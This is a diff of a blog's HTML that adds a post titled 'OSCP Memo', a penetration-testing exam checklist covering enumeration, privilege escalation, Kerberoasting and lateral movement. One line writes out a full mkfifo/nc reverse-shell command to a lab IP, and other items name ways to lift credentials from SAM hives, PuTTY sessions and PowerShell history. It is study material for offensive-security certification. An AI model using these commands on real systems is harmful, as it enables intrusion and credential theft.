@@ -4,8 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hyun">
-    <meta name="description" content="瞻彼淇奥，绿竹猗猗。有匪君子，如切如磋，如琢如磨。">
+    <meta name="keywords" content="OSCP Memo, Hyun">
+    <meta name="description" content="OSCP MemoInformation Gathernamp
+ tcp all port (Use -sT and double check)
+ Scripts
+ udp (eg. SNMP: sudo -sU -p161 or sudo">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hyun</title>
+    <title>OSCP Memo | Hyun</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -43,6 +46,10 @@
 
 
 
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
 
 
 
@@ -327,364 +334,499 @@
 </header>
 
     
-    <div class="bg-cover pd-header about-cover">
-    <div class="container">
-    <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                
-                Hyun
-                
-            </div>
 
-            <div class="description center-align">
-                
-                <span id="subtitle"></span>
-                <script src="/libs/typed/typed.js"></script>
-                <script>
-                    var typed = new Typed("#subtitle", {
-                        strings: [ 
-                            
-                                "兰之猗猗 扬扬其香 不采而佩 于兰何伤",
-                            
-                                "The darkness is no darkness with thee",
-                            
-                        ],
-                        startDelay: 300,
-                        typeSpeed: 100,
-                        loop: true,
-                        backSpeed: 50,
-                        showCursor: true
-                    });
-                </script>
-                
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">OSCP Memo</h1>
+                </div>
             </div>
         </div>
     </div>
 </div>
 
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/OSCP/">
+                                <span class="chip bg-color">OSCP</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2023-06-28
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    269
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    1 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="OSCP-Memo"><a href="#OSCP-Memo" class="headerlink" title="OSCP Memo"></a>OSCP Memo</h1><h2 id="Information-Gather"><a href="#Information-Gather" class="headerlink" title="Information Gather"></a>Information Gather</h2><h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><ul>
+<li><input disabled type="checkbox"> tcp all port (Use -sT and double check)</li>
+<li><input disabled type="checkbox"> Scripts</li>
+<li><input disabled type="checkbox"> udp (eg. SNMP: sudo -sU -p161 or sudo nmap -sU -Pn -min-rate 100 192.168.235.151)</li>
+<li><input disabled type="checkbox"> proxychians -n flag</li>
+<li><input disabled type="checkbox"> nc or telnet unusual ports</li>
+</ul>
+<h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><ul>
+<li><input disabled type="checkbox"> Use -mc flag with caution</li>
+<li><input disabled type="checkbox"> Modify &#x2F;etc&#x2F;hosts</li>
+<li><input disabled type="checkbox"> Iterative scanning</li>
+<li><input disabled type="checkbox"> Fuzz vhost</li>
+</ul>
+<h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><ul>
+<li><input disabled type="checkbox"> -L for $IPC shares</li>
+<li><input disabled type="checkbox"> Using domain account</li>
+</ul>
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><ul>
+<li><input disabled type="checkbox"> Switch passive to active mode</li>
+<li><input disabled type="checkbox"> Switch bin mode for download</li>
+</ul>
+<h3 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h3><ul>
+<li><input disabled type="checkbox"> View author</li>
+</ul>
+<h2 id="Initial-foothold"><a href="#Initial-foothold" class="headerlink" title="Initial foothold"></a>Initial foothold</h2><ul>
+<li><input disabled type="checkbox"> RFI or NTLMv2 (eg. impaket-smbserver -a .&#x2F; -smb2support)</li>
+<li><input disabled type="checkbox"> nc without -e flag? use ‘rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 192.168.45.241 9001 &gt;&#x2F;tmp&#x2F;f’</li>
+</ul>
+<h2 id="Privilege-elevate"><a href="#Privilege-elevate" class="headerlink" title="Privilege elevate"></a>Privilege elevate</h2><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul>
+<li><input disabled type="checkbox"> SeImpersonatePrivilege (eg. PrintSpoofer or jucy-potato NG)</li>
+<li><input disabled type="checkbox"> Services running on internal ports are very important</li>
+<li><input disabled type="checkbox"> set</li>
+<li><input disabled type="checkbox"> PS history (eg. (Get-PSReadlineOption).HistorySavePath)</li>
+<li><input disabled type="checkbox"> windows.old (eg. SAM and SYSTEM)</li>
+<li><input disabled type="checkbox"> KeePass</li>
+<li><input disabled type="checkbox"> Putty (eg. reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions)</li>
+<li><input disabled type="checkbox"> Kerberoast (eg. Rubeus.exe or impacket-GetUserSPNs)</li>
+<li><input disabled type="checkbox"> AS-REP (eg. impaket-GetNPUsers)</li>
+<li><input disabled type="checkbox"> shutdown &#x2F;r &#x2F;t 0</li>
+</ul>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul>
+<li><input disabled type="checkbox"> export</li>
+<li><input disabled type="checkbox"> Services running on internal ports are very important</li>
+<li><input disabled type="checkbox"> history</li>
+<li><input disabled type="checkbox"> backup</li>
+<li><input disabled type="checkbox"> pspy (eg. scheduled tasks detection)</li>
+<li><input disabled type="checkbox"> sudo -l (eg. awk or find)</li>
+</ul>
+<h2 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h2><ul>
+<li><input disabled type="checkbox"> .git or git config is important</li>
+<li><input disabled type="checkbox"> VNC Key</li>
+</ul>
+<h2 id="Lateral-movement"><a href="#Lateral-movement" class="headerlink" title="Lateral movement"></a>Lateral movement</h2><ul>
+<li><input disabled type="checkbox"> Credential spraying (eg. crackmapexec, Attention that some rdp services cannot discovered and use –local-auth with caution)</li>
+<li><input disabled type="checkbox"> impaket-mssqlclient use -windows-auth with caution</li>
+<li><input disabled type="checkbox"> Use impaket-psexec, xfreerdp or evil-winrm and if need to specify a domain user, please note use double backslashes for escaping (eg. -u relia.com\\Administrator)</li>
+</ul>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Hyun Wen</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://wensite.top/2023/06/28/oscp-memo/">http://wensite.top/2023/06/28/oscp-memo/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Hyun Wen</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/OSCP/">
+                                    <span class="chip bg-color">OSCP</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
 
 <script>
-    // 每天切换 banner 图.  Switch banner image every day.
-    var bannerUrl = "/medias/banner/" + new Date().getDay() + '.jpg';
-    $('.bg-cover').css('background-image', 'url(' + bannerUrl + ')');
+    $(function () {
+        $('.tabs').tabs();
+    });
 </script>
 
-
+            
+        </div>
     </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2023/06/28/oscp-memo/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="OSCP Memo">
+                        
+                        <span class="card-title">OSCP Memo</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Hyun Wen
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/OSCP/">
+                        <span class="chip bg-color">OSCP</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/03/30/fa-zhi-si-xiang/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="法治思想">
+                        
+                        <span class="card-title">法治思想</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Hyun Wen
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B3%95%E8%80%83/">
+                        <span class="chip bg-color">法考</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
 </div>
 
 
-<main class="content">
 
-    
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-    
 
-    <!-- 所有文章卡片 -->
-    <article id="articles" class="container articles">
-        <div class="row article-row">
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2019/11/21/0x05-xin-xi-xie-lu/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="0x05信息泄露">
-                            
-                            <span class="card-title">0x05信息泄露</span>
-                        </div>
-                    </a>
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                0x05信息泄露一、概述信息泄露在安全审计中屡见不鲜，对于存有大量用户KYC信息的交易所来说影响更加深远，是非常严重的安全问题。零时科技安全团队在审计大量交易所后发现，信息泄露问题一般集中于交易所的账户体系、OTC交易系统、用户订单、邀请列
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-21
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Hyun Wen
-                                
-                            </span>
-                        </div>
-                    </div>
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/">
-                            <span class="chip bg-color">区块链安全</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2019/11/18/0x04-ye-wu-luo-ji/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="0x04业务逻辑">
-                            
-                            <span class="card-title">0x04业务逻辑</span>
-                        </div>
-                    </a>
+<!-- 代码语言 -->
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                0x04业务逻辑一、概述对于交易所来说，一个逻辑完备，鉴权完整的交易流程必不可少。业务逻辑漏洞独立与其他服务却又容易受到其他安全问题的牵扰。与SQL注入、XSS等常规web安全漏洞不同，业务逻辑漏洞使用正常的业务流程中的程序固有不足，逻辑设
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-18
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Hyun Wen
-                                
-                            </span>
-                        </div>
-                    </div>
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/">
-                            <span class="chip bg-color">区块链安全</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2019/11/17/0x03-an-quan-pei-zhi/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="0x03安全配置">
-                            
-                            <span class="card-title">0x03安全配置</span>
-                        </div>
-                    </a>
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                0x05安全配置一、概述服务端是一种专门为某一客户端设立的，具有针对性的程序，通常都只具备认证与传输数据功能。比如游戏服务端，就是专门为游戏客户端提供服务的，服务的内容包括为客户端提供登录服务，保存游戏玩家资料，提供玩家在线游戏等。而游戏客
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-17
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Hyun Wen
-                                
-                            </span>
-                        </div>
-                    </div>
+<!-- 代码块复制 -->
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/">
-                            <span class="chip bg-color">区块链安全</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2019/11/15/0x02-shu-ru-shu-chu/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="0x02输入输出">
-                            
-                            <span class="card-title">0x02输入输出</span>
-                        </div>
-                    </a>
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                0x02输入输出一、概述输入输出的安全问题来源于开发人员编码过程中的粗心大意以及应有的安全意识的缺失。这些安全问题对于网站来说是非常严峻的，对数据库，网站管理权限，内网都有巨大威胁。而且利用手法很多，如利用任意文件上传漏洞可直接获取网站sh
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-15
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Hyun Wen
-                                
-                            </span>
-                        </div>
-                    </div>
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/">
-                            <span class="chip bg-color">区块链安全</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2019/11/14/0x01-she-hui-gong-cheng/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="0x01社会工程">
-                            
-                            <span class="card-title">0x01社会工程</span>
-                        </div>
-                    </a>
+<!-- 代码块收缩 -->
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                0x01社会工程一、概述社会工程学是信息收集技术的延伸和升级，是一种高级的信息利用手段。系统中最大的漏洞永远是人，社会工程学攻击则是一种高效利用这种漏洞的手段，它看似不起眼，也不专业，也没有技术性，但其实是最有效，最直接的攻击手段之一。
-面
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-14
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Hyun Wen
-                                
-                            </span>
-                        </div>
-                    </div>
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/">
-                            <span class="chip bg-color">区块链安全</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2019/11/08/0x00-xin-xi-shou-ji/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="0x00信息收集">
-                            
-                            <span class="card-title">0x00信息收集</span>
-                        </div>
-                    </a>
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                0x00信息收集一、概述　　对于所有安全相关的测试来说，信息收集都是非常重要且必要的第一步，有时一次非常全面完善的信息收集甚至会占到一次渗透测试总工程量的的70%到80%，能为后续的工作节省大量精力，提供便利，数字货币交易所的安全测试也是一
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-08
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Hyun Wen
-                                
-                            </span>
-                        </div>
-                    </div>
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/">
-                            <span class="chip bg-color">区块链安全</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
         </div>
-    </article>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
 
 </main>
-
-
-<div class="container paging">
-    <div class="row">
-        <div class="col s6 m4 l4">
-            
-            <a href="/"
-               class="left btn-floating btn-large waves-effect waves-light bg-color">
-                <i class="fas fa-angle-left"></i>
-            </a>
-            
-        </div>
-        <div class="page-info col m4 l4 hide-on-small-only">
-            <div class="center-align b-text-gray">2 / 2</div>
-        </div>
-        <div class="col s6 m4 l4">
-            
-            <a class="right btn-floating btn-large disabled">
-                <i class="fas fa-angle-right"></i>
-            </a>
-            
-        </div>
-    </div>
-</div>
 
 
 
